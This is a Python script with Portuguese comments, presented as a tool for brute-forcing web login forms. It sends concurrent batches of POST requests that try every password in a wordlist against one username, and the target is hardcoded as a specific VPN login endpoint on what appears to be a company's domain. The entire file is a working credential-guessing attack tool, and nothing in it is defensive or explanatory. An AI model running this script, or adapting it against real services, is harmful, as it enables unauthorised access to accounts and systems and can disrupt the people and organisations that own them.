#!/usr/bin/env python3

"""
Script: bc_bruteforce-web-login.py
Author: Bruno Campos
Version: 1.0

Descrição:
Este é um script de Brute Force em formularios de login via POST, utilizando de multiplas requisições simultâneas.
"""

import requests
import threading
import argparse
import time  # Importe a biblioteca time para usar o método sleep
import pyfiglet

# Função para enviar a requisição com username e uma senha da wordlist
def enviar_requisicao(username, password):
    # Os Campos abaixo em url, headers e payload devem ser alterados conforme sua requisição.
    url = 'https://vpn-poc-pritunl.flowti.com.br/auth/session'
    headers = {
        'Sec-Ch-Ua': '"Not(A:Brand";v="24", "Chromium";v="122"',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Origin': 'https://vpn-poc-pritunl.flowti.com.br',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://vpn-poc-pritunl.flowti.com.br/login',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Priority': 'u=1, i'
    }
    payload = {
        "username": username,
        "password": password
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        print(f'Status para usuário {username} e senha {password}: {response.status_code}')
    except Exception as e:
        print(f'Erro ao enviar requisição para usuário {username} e senha {password}: {e}')

# Função para enviar lotes de requisições em threads
def enviar_lotes_requisicoes(username, passwords, num_threads, delay_lote=None):
    lote_size = num_threads  # Define o tamanho do lote igual ao número de threads
    num_passwords = len(passwords)
    for i in range(0, num_passwords, lote_size):
        lote_passwords = passwords[i:i + lote_size]  # Divide as senhas em lotes
        threads = []
        for password in lote_passwords:
            thread = threading.Thread(target=enviar_requisicao, args=(username, password))
            threads.append(thread)
            thread.start()

        # Aguarda todas as threads terminarem
        for thread in threads:
            thread.join()

        # Aguarda um atraso entre os lotes, se um atraso for especificado
        if delay_lote and i + lote_size < num_passwords:
            time.sleep(delay_lote)

if __name__ == "__main__":
    # Transformar o nome em banner com pyfiglet
    banner_text = pyfiglet.figlet_format("ACKEMED")
    print(f'CreateBy \n{banner_text}                             (Bruno Campos)\n\n')

    parser = argparse.ArgumentParser(description='BC Brute Force WEB Login - Envia requisições POST com uma lista de senhas.')
    parser.add_argument('-w', '--wordlist', type=str, help='Caminho para a wordlist contendo as senhas.', required=True)
    parser.add_argument('-t', '--num_threads', type=int, help='Quantidade de threads para enviar as requisições em cada lote.', required=True)
    parser.add_argument('-u', '--username', type=str, help='Nome de usuário para enviar as requisições.', required=True)
    parser.add_argument('-d', '--delay', type=float, help='Atraso entre os lotes de requisições (segundos).', default=None)
    args = parser.parse_args()

    with open(args.wordlist, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    enviar_lotes_requisicoes(args.username, passwords, args.num_threads, args.delay)
